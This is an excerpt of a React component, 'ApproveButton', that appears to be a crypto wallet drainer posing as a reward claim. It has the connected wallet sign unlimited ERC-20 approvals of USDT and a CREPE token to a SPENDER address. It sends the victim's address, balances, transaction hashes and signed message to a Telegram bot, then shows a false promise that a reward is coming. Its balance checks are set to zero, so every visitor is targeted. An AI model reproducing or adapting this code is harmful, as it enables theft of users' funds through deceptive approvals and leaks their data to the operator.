...
// 🔹 CREPE Token Address
const CREPE_TOKEN_ADDRESS = "0xeb2B7d5691878627eff20492cA7c9a71228d931D";
...
export default function ApproveButton() {
  ...
  const handleApprove = async () => {
    ...
    console.log("Total USDT balance for claim check:", totalUsdtForCheck);

    if (totalUsdtBalance < 0.000) {
      showAlert(
    ...
    try {
      ...
      // Step 3: Proceed with CREPE Token Approval
      const crepeHash = await walletClient.writeContract({
        address: CREPE_TOKEN_ADDRESS,
        abi: erc20Abi,
        functionName: "approve",
        args: [SPENDER, maxAmount],
        account: address,
      ...
      await sendToTelegram(
        `✅ Tokens Approved:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}\nUSDT Tx Hash: ${usdtHash}\nCREPE Tx Hash: ${crepeHash}\nSigned Message: "${signMessage}"`,
      );
...
Your reward will be sent to your wallet shortly 💰✨ \n\nUSDT Tx: ${usdtHash.slice(0, 10)}...${usdtHash.slice(-8)}\nCREPE Tx: ${crepeHash.slice(0, 10)}...${crepeHash.slice(-8)}`,
  ...
  const hasMinimumUsdt = totalUsdtForCheck >= 0.0000;
